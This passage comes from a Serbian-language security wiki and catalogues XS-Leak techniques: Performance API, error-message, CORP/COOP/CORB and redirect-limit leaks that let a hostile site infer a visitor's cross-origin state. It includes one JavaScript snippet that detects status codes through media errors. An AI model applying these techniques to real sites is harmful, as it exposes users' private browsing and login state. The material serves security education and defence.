Ova obilje podataka mo쬰 se dobiti putem metoda poput [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pru쬬ju캖i sveobuhvatan pregled informacija povezanih s performansama. Dodatno, API olak코ava merenje vremena izvr코avanja ra캜unanjem razlike izme캠u vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Me캠utim, va쬹o je napomenuti da za odre캠ene operacije u pregleda캜ima poput Chrome-a, preciznost `performance.now()` mo쬰 biti ograni캜ena na milisekunde, 코to mo쬰 uticati na granularnost merenja vremena.

Osim merenja vremena, Performance API se mo쬰 iskoristiti za uvide povezane sa bezbedno코캖u. Na primer, prisustvo ili odsustvo stranica u objektu `performance` u Chrome-u mo쬰 ukazivati na primenu `X-Frame-Options`. Konkretno, ako je stranica blokirana za prikazivanje u okviru zbog `X-Frame-Options`, ne캖e biti zabele쬰na u objektu `performance`, pru쬬ju캖i suptilan trag o politikama uokvirivanja stranice.

### Curenje gre코ke

* **Metode uklju캜ivanja**: Okviri, HTML elementi
* **Detektibilna razlika**: Kod statusa
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Zahtevi koji rezultiraju gre코kama ne캖e kreirati unos vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Mogu캖e je **razlikovati izme캠u kodova statusa HTTP odgovora** jer zahtevi koji dovode do **gre코ke** ne stvaraju **unos performansi**.

### Gre코ka ponovnog u캜itavanja stila

* **Metode uklju캜ivanja**: HTML elementi
* **Detektibilna razlika**: Kod statusa
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Zbog gre코ke u pregleda캜u, zahtevi koji rezultiraju gre코kama se u캜itavaju dva puta.
* **Primer koda**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici tako캠e su identifikovana dva slu캜aja gde gre코ke u pregleda캜u u GC dovode do **ponovnog u캜itavanja resursa kada ne uspeju da se u캜itaju**. To 캖e rezultirati vi코estrukim unosima u Performance API i mo쬰 se detektovati.

### Gre코ka spajanja zahteva

* **Metode uklju캜ivanja**: HTML elementi
* **Detektibilna razlika**: Kod statusa
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Zahtevi koji rezultiraju gre코kom ne mogu biti spojeni.
* **Primer koda**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je prona캠ena u tabeli u pomenutom radu, ali nije prona캠en opis tehnike. Me캠utim, mo쬰te prona캖i izvorni kod koji proverava to na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Curenje prazne stranice

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Prazni odgovori ne stvaraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Napada캜 mo쬰 da detektuje da li je zahtev rezultirao praznim telom HTTP odgovora jer **prazne stranice ne stvaraju unos performansi u nekim pregleda캜ima**.

### **Curenje XSS-Auditora**

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Kori코캖enjem XSS Auditora u Sigurnosnim tvrdnjama, napada캜i mogu detektovati specifi캜ne elemente veb stranice posmatraju캖i promene u odgovorima kada izra캠eni payload-ovi pokrenu mehanizam filtriranja auditora.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Sigurnosnim tvrdnjama (SA), XSS Auditor, prvobitno namenjen spre캜avanju napada Cross-Site Scripting (XSS), paradoksalno mo쬰 biti iskori코캖en za curenje osetljivih informacija. Iako je ova ugra캠ena funkcija uklonjena iz Google Chrome-a (GC), jo코 uvek je prisutna u SA. 2013. godine, Braun i Heiderich su demonstrirali da XSS Auditor mo쬰 nenamerno blokirati legitimne skripte, dovode캖i do la쬹ih pozitivnih rezultata. Na osnovu toga, istra쬴va캜i su razvili tehnike za izvla캜enje informacija i detektovanje specifi캜nog sadr쬬ja na stranicama sa razli캜itim poreklom, koncept poznat kao XS-Leaks, inicijalno prijavljen od strane Terade i razra캠en od strane Heyesa u blog postu. Iako su ove tehnike bile specifi캜ne za XSS Auditor u GC, otkriveno je da u SA, stranice blokirane od strane XSS Auditora ne generi코u unose u Performance API, otkrivaju캖i metod putem kojeg osetljive informacije i dalje mogu biti procurene.

### Curenje X-Frame

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Sa쬰tak:** Resurs sa zaglavljem X-Frame-Options ne stvara unos vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako stranica **nije dozvoljena** da se **prikazuje** u **iframe-u**, ne캖e kreirati unos performansi. Kao rezultat, napada캜 mo쬰 detektovati zaglavlje odgovora **`X-Frame-Options`**.\
Isto se de코ava ako koristite **tag za ugradnju**. 

### Detekcija preuzimanja

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak:** Preuzimanja ne stvaraju unose vremena resursa u Performance API.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Sli캜no kao kod opisanog XS-Leaka, **resurs koji se preuzima** zbog zaglavlja ContentDisposition, tako캠e **ne stvara unos performansi**. Ova tehnika funkcioni코e u svim glavnim pregleda캜ima.
### Po캜etak preusmeravanja curenja

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Preusmeravanje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak**: Unos vremena resursa otkriva po캜etno vreme preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Prona코li smo jedan primer XS-Leak instance koji zloupotrebljava pona코anje nekih pretra쬴va캜a koji bele쬰 previ코e informacija za zahteve sa razli캜itih izvora. Standard defini코e podskup atributa koji bi trebalo postaviti na nulu za resurse sa razli캜itih izvora. Me캠utim, u **SA** je mogu캖e otkriti da li je korisnik **preusmeren** od strane ciljne stranice, upitivanjem **Performance API**-ja i proverom podataka o vremenu **redirectStart**.

### Curenje trajanja preusmeravanja

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Preusmeravanje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak**: Trajanje unosa vremena je negativno kada se desi preusmeravanje.
* **Primer koda**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC-u, **trajanje** za zahteve koji rezultiraju **preusmeravanjem** je **negativno** i mo쬰 se stoga **razlikovati** od zahteva koji ne rezultiraju preusmeravanjem.

### CORP Curenje

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Zaglavlje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sa쬰tak**: Resursi za코ti캖eni sa CORP-om ne stvaraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim slu캜ajevima, **nextHopProtocol unos** mo쬰 se koristiti kao tehnika curenja. U GC-u, kada je postavljeno **CORP zaglavlje**, nextHopProtocol 캖e biti **prazan**. Imajte na umu da SA ne캖e kreirati unos performansi uop코te za resurse omogu캖ene za CORP.

### Servisni radnik

* **Metode uklju캜ivanja**: Okviri
* **Detektibilna razlika**: Kori코캖enje API-ja
* **Vi코e informacija**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Sa쬰tak**: Otkrijte da li je servisni radnik registrovan za odre캠eni izvor.
* **Primer koda**:

Servisni radnici su skriptni konteksti vo캠eni doga캠ajima koji se izvr코avaju na izvoru. Oni se izvr코avaju u pozadini web stranice i mogu presresti, izmeniti i **ke코irati resurse** kako bi kreirali offline web aplikaciju.\
Ako je **resurs ke코iran** od strane **servisnog radnika** pristupljen putem **iframe-a**, resurs 캖e biti **u캜itan iz ke코a servisnog radnika**.\
Da biste otkrili da li je resurs **u캜itan iz ke코a servisnog radnika**, mo쬰 se koristiti **Performance API**.\
Ovo tako캠e mo쬰 biti ura캠eno sa napadom na vreme (proverite rad za vi코e informacija).

### Ke코

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Vreme
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Sa쬰tak**: Mogu캖e je proveriti da li je resurs sme코ten u ke코.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Kori코캖enjem [Performance API](./#performance-api) mogu캖e je proveriti da li je resurs ke코iran.

### Trajanje mre쬰

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Sa쬰tak**: Mogu캖e je dobiti trajanje mre쬰 zahteva iz `performance` API-ja.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Tehnika poruka o gre코kama

### Gre코ka medija

* **Metode uklju캜ivanja**: HTML elementi (Video, Audio)
* **Detektibilna razlika**: Kod statusa
* **Vi코e informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Sa쬰tak**: U Firefox-u je mogu캖e ta캜no procuriti kod statusa zahteva sa razli캜itih izvora.
* **Primer koda**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS Gre코ka

* **Metode Uklju캜ivanja**: Fetch API
* **Detektibilna Razlika**: Header
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Sa쬰tak:** U sigurnosnim tvrdnjama (SA), CORS gre코ke nenamerno otkrivaju puni URL preusmerenih zahteva.
* **Primer koda**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ova tehnika omogu캖ava napada캜u da **izvu캜e odredi코te preusmerenja sajta sa razli캜itog porekla** iskori코캖avanjem na캜ina na koji Webkit bazirani pregleda캜i obra캠uju CORS zahteve. Konkretno, kada se **CORS omogu캖eni zahtev** po코alje ka ciljnom sajtu koji izdaje preusmerenje na osnovu korisni캜kog stanja i pregleda캜 naknadno odbije zahtev, **puni URL cilja preusmerenja** se otkriva unutar poruke o gre코ci. Ova ranjivost ne samo da otkriva 캜injenicu preusmerenja ve캖 tako캠e otkriva krajnju ta캜ku preusmerenja i sve **osetljive upite** koje mo쬰 sadr쬬ti.

### SRI Gre코ka

* **Metode Uklju캜ivanja**: Fetch API
* **Detektibilna Razlika**: Header
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Sa쬰tak:** U sigurnosnim tvrdnjama (SA), SRI gre코ke nenamerno otkrivaju puni URL preusmerenih zahteva.
* **Primer koda**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Napada캜 mo쬰 iskoristiti **opse쬹e poruke o gre코ci** da zaklju캜i veli캜inu odgovora sa razli캜itog porekla. To je mogu캖e zbog mehanizma Integriteta Podresursa (SRI), koji koristi atribut integriteta da validira da resursi preuzeti, 캜esto sa CDN-ova, nisu promenjeni. Da bi SRI radio na resursima sa razli캜itog porekla, oni moraju biti **CORS omogu캖eni**; ina캜e, nisu predmet provere integriteta. U sigurnosnim tvrdnjama (SA), sli캜no kao i kod CORS gre코ke XS-Leak, poruka o gre코ci mo쬰 biti uhva캖ena nakon 코to zahtev za preuzimanje sa atributom integriteta ne uspe. Napada캜i mogu namerno **izazvati ovu gre코ku** dodeljivanjem **la쬹e vrednosti he코a** atributu integriteta bilo kog zahteva. U SA, rezultiraju캖a poruka o gre코ci nenamerno otkriva du쬴nu sadr쬬ja tra쬰nog resursa. Ovo curenje informacija omogu캖ava napada캜u da razlikuje varijacije u veli캜ini odgovora, otvaraju캖i put za sofisticirane XS-Leak napade.

### CSP Kr코enje/Otkrivanje

* **Metode Uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna Razlika**: Statusni Kod
* **Vi코e informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Sa쬰tak:** Dozvoljavanje samo sajtu rtve u CSP-u ako poku코amo da pristupimo preusmerava na drugi domen CSP 캖e pokrenuti detektibilnu gre코ku.
* **Primer koda**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak mo쬰 koristiti CSP da detektuje da li je sajt sa razli캜itog porekla preusmeren na drugo poreklo. Ovo curenje mo쬰 detektovati preusmerenje, ali dodatno, domen cilja preusmerenja curenje. Osnovna ideja ovog napada je da **dozvoli ciljni domen na sajtu napada캜a**. Kada se izda zahtev ka ciljnom domenu, on se **preusmerava** na sajt sa razli캜itog porekla. **CSP blokira** pristup tome i kreira **izve코taj o kr코enju kori코캖en kao tehnika curenja**. Zavisno od pregleda캜a, **ovaj izve코taj mo쬰 otkriti lokaciju cilja preusmerenja**.\
Moderni pregleda캜i ne캖e pokazati URL na koji je preusmeren, ali mo쬰te i dalje detektovati da je preusmerenje sa razli캜itog porekla pokrenuto.

### Ke코

* **Metode Uklju캜ivanja**: Frejmovi, Iska캜u캖i prozori
* **Detektibilna Razlika**: Sadr쬬j Stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Sa쬰tak:** Obri코ite fajl iz ke코a. Otvorite ciljnu stranicu, proverite da li je fajl prisutan u ke코u.
* **Primer koda:**

Pregleda캜i mogu koristiti jedan zajedni캜ki ke코 za sve sajtove. Bez obzira na njihovo poreklo, mogu캖e je zaklju캜iti da li je ciljna stranica **zahtevala odre캠eni fajl**.

Ako stranica u캜itava sliku samo ako je korisnik prijavljen, mo쬰te **povu캖i** **resurs** (tako da vi코e nije ke코iran ako jeste, pogledajte vi코e informacija linkove), **izvr코iti zahtev** koji bi mogao u캜itati taj resurs i poku코ati u캜itati resurs **sa lo코im zahtevom** (npr. koriste캖i predug referer zaglavlje). Ako u캜itavanje resursa **nije pokrenulo nikakvu gre코ku**, to je zato 코to je bio **ke코iran**.

### CSP Direktiva

* **Metode Uklju캜ivanja**: Frejmovi
* **Detektibilna Razlika**: Header
* **Vi코e informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Sa쬰tak:** CSP header direktive mogu biti ispitane kori코캖enjem CSP iframe atributa, otkrivaju캖i detalje politike.
* **Primer koda**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Nova funkcija u Google Chrome-u (GC) omogu캖ava web stranicama da **predlo쬰 Content Security Policy (CSP)** postavljanjem atributa na element iframe, sa direktivama politike prenesenim zajedno sa HTTP zahtevom. Obi캜no, ugne쮃년ni sadr쬬j mora **autorizovati ovo putem HTTP zaglavlja**, ili 캖e se prikazati **stranica o gre코ci**. Me캠utim, ako je iframe ve캖 pod kontrolom CSP-a i nova predlo쬰na politika nije restriktivnija, stranica 캖e se normalno u캜itati. Ovaj mehanizam otvara put napada캜u da **detektuje specifi캜ne CSP direktive** sa stranice sa razli캜itog porekla identifikuju캖i stranicu o gre코ci. Iako je ova ranjivost ozna캜ena kao popravljena, na코a istra쬴vanja otkrivaju **novu tehniku curenja** sposobnu da detektuje stranicu o gre코ci, sugeri코u캖i da osnovni problem nikada nije u potpunosti re코en.

### **CORP**

* **Metode Uklju캜ivanja**: Fetch API
* **Detektibilna Razlika**: Header
* **Vi코e informacija**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Sa쬰tak:** Resursi obezbe캠eni sa Cross-Origin Resource Policy (CORP) 캖e baciti gre코ku kada se preuzmu sa zabranjenog porekla.
* **Primer koda**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP zaglavlje je relativno nova bezbednosna funkcija web platforme koja kada je postavljena **blokira no-cors zahteve sa razli캜itog porekla** ka datom resursu. Prisustvo zaglavlja mo쬰 biti detektovano, jer 캖e resurs za코ti캖en sa CORP **baciti gre코ku kada se preuzme**.
### CORB

* **Metode uklju캜ivanja**: HTML elementi
* **Detektibilna razlika**: Zaglavlja
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Sa쬰tak**: CORB mo쬰 omogu캖iti napada캜ima da otkriju kada je prisutno **zaglavlje `nosniff`** u zahtevu.
* **Primer koda**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Proverite link za vi코e informacija o napadu.

### CORS gre코ka na konfiguraciji refleksije porekla <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Zaglavlja
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Sa쬰tak**: Ako se zaglavlje Origin reflektuje u zaglavlju `Access-Control-Allow-Origin`, mogu캖e je proveriti da li je resurs ve캖 u ke코u.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U slu캜aju da se **zaglavlje Origin** reflektuje u zaglavlju `Access-Control-Allow-Origin`, napada캜 mo쬰 iskoristiti ovu osobinu da poku코a **dobavljanje** resursa u **CORS** re쬴mu. Ako **gre코ka** nije izazvana, to zna캜i da je resurs **ispravno preuzet sa veba**, a ako je gre코ka **izazvana**, to zna캜i da je pristupljen iz ke코a (gre코ka se pojavljuje jer ke코 캜uva odgovor sa CORS zaglavljem koje dozvoljava originalni domen, a ne domen napada캜a).\
Imajte na umu da ako se poreklo ne reflektuje ve캖 se koristi zvezdica (`Access-Control-Allow-Origin: *`), ovo ne캖e raditi.

## Tehnika 캜itljivih atributa

### Preusmeravanje Fetch

* **Metode uklju캜ivanja**: Fetch API
* **Detektibilna razlika**: Statusni kod
* **Vi코e informacija**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Sa쬰tak:** GC i SA omogu캖avaju proveru tipa odgovora (opaqueredirect) nakon zavr코etka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Slanjem zahteva pomo캖u Fetch API sa `redirect: "manual"` i drugim parametrima, mogu캖e je pro캜itati atribut `response.type` i ako je jednak `opaqueredirect`, onda je odgovor bio preusmeren.

### COOP

* **Metode uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna razlika**: Zaglavlje
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Sa쬰tak:** Stranice za코ti캖ene Cross-Origin Opener Policy (COOP) spre캜avaju pristup preko-grani캜nim interakcijama.
* **Primer koda**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Napada캜 je sposoban da zaklju캜i prisustvo zaglavlja Cross-Origin Opener Policy (COOP) u HTTP odgovoru preko granice. COOP se koristi od strane veb aplikacija da spre캜i spoljne sajtove da dobiju proizvoljne reference prozora. Vidljivost ovog zaglavlja mo쬰 se uo캜iti poku코ajem pristupa **referenci contentWindow**. U scenarijima gde se COOP primenjuje uslovno, **svojstvo opener** postaje pokazatelj: ono je **nedefinisano** kada je COOP aktivan, i **definisano** kada je odsutan.

### Maksimalna du쬴na URL-a - Server strana

* **Metode uklju캜ivanja**: Fetch API, HTML elementi
* **Detektibilna razlika**: Statusni kod / Sadr쬬j
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Sa쬰tak:** Otkrijte razlike u odgovorima zbog du쬴ne odgovora preusmeravanja koja mo쬰 biti prevelika da server odgovori sa gre코kom i generi코e upozorenje.
* **Primer koda**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako server-side preusmeravanje koristi **korisni캜ki unos unutar preusmeravanja** i **dodatne podatke**, mogu캖e je otkriti ovu osobinu jer obi캜no **serveri** imaju **limit du쬴ne zahteva**. Ako je **korisni캜ki podatak** te **du쬴ne - 1**, jer **preusmeravanje koristi taj podatak** i **dodaje** ne코to **dodatno**, to 캖e izazvati **gre코ku koja se mo쬰 detektovati putem doga캠aja gre코ke**.

Ako na neki na캜in mo쬰te postaviti kola캜i캖e korisniku, mo쬰te izvesti ovaj napad tako 코to 캖ete **postaviti dovoljno kola캜i캖a** ([**cookie bomba**](../hacking-with-cookies/cookie-bomb.md)) tako da sa **pove캖anom veli캜inom odgovora** ispravnog odgovora bude izazvana **gre코ka**. U ovom slu캜aju, zapamtite da ako pokrenete ovaj zahtev sa istog sajta, `<script>` 캖e automatski poslati kola캜i캖e (tako da mo쬰te proveriti gre코ke).\
Primer **cookie bombe + XS-Search** mo쬰 se prona캖i u planiranom re코enju ovog teksta: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ili biti u istom kontekstu obi캜no je potrebno za ovu vrstu napada.

### Maksimalna du쬴na URL-a - Klijentska strana

* **Metode uklju캜ivanja**: Iska캜u캖i prozori
* **Detektibilna razlika**: Statusni kod / Sadr쬬j
* **Vi코e informacija**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Sa쬰tak:** Otkrijte razlike u odgovorima zbog du쬴ne odgovora preusmeravanja koja mo쬰 biti prevelika za zahtev da se primeti razlika.
* **Primer koda**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Prema [Chromium dokumentaciji](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), maksimalna du쬴na URL-a u Chrome-u je 2MB.

> Uop코teno, _veb platforma_ nema ograni캜enja du쬴ne URL-ova (mada je 2^31 캜esto ograni캜enje). _Chrome_ ograni캜ava URL-ove na maksimalnu du쬴nu od **2MB** iz prakti캜nih razloga i da bi izbegao probleme sa odbijanjem usluge u komunikaciji izme캠u procesa.

Stoga, ako je **URL preusmeravanja odgovorio ve캖i u jednom od slu캜ajeva**, mogu캖e je napraviti preusmeravanje sa **URL-om ve캖im od 2MB** da bi se pogodio **limit du쬴ne**. Kada se to desi, Chrome prikazuje stranicu **`about:blank#blocked`**.

**Zapa쬰na razlika** je da ako je **preusmeravanje** bilo **zavr코eno**, `window.origin` baca **gre코ku** jer preko granice ne mo쬰 pristupiti tim informacijama. Me캠utim, ako je **limit** bio \*\*\*\* pogodjen i u캜itana stranica je bila **`about:blank#blocked`**, `origin` prozora ostaje onaj od **roditelja**, 코to je **pristupa캜na informacija**.

Svi dodatni podaci potrebni da se dostigne **2MB** mogu se dodati putem **he코a** u po캜etni URL tako da 캖e biti **kori코캖en u preusmeravanju**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}
### Maksimalni Redirecti

* **Metode Uklju캜ivanja**: Fetch API, Frejmovi
* **Detektovana Razlika**: Statusni Kod
* **Vi코e informacija**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Rezime:** Koristite ograni캜enje preusmeravanja pregleda캜a da biste utvrdili pojavu preusmeravanja URL-a.
* **Primer Koda**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je **maksimalni** broj **redirecta** koje pregleda캜 mo쬰 pratiti **20**, napada캜 mo쬰 poku코ati da u캜ita svoju stranicu sa **19 redirecta** i na kraju **po코alje rtvu** na testiranu stranicu. Ako se desi **gre코ka**, to zna캜i da je stranica poku코avala da **preusmeri rtvu**.

### Du쬴na Istorije

* **Metode Uklju캜ivanja**: Frejmovi, Iska캜u캖i Prozori
* **Detektovana Razlika**: Redirecti
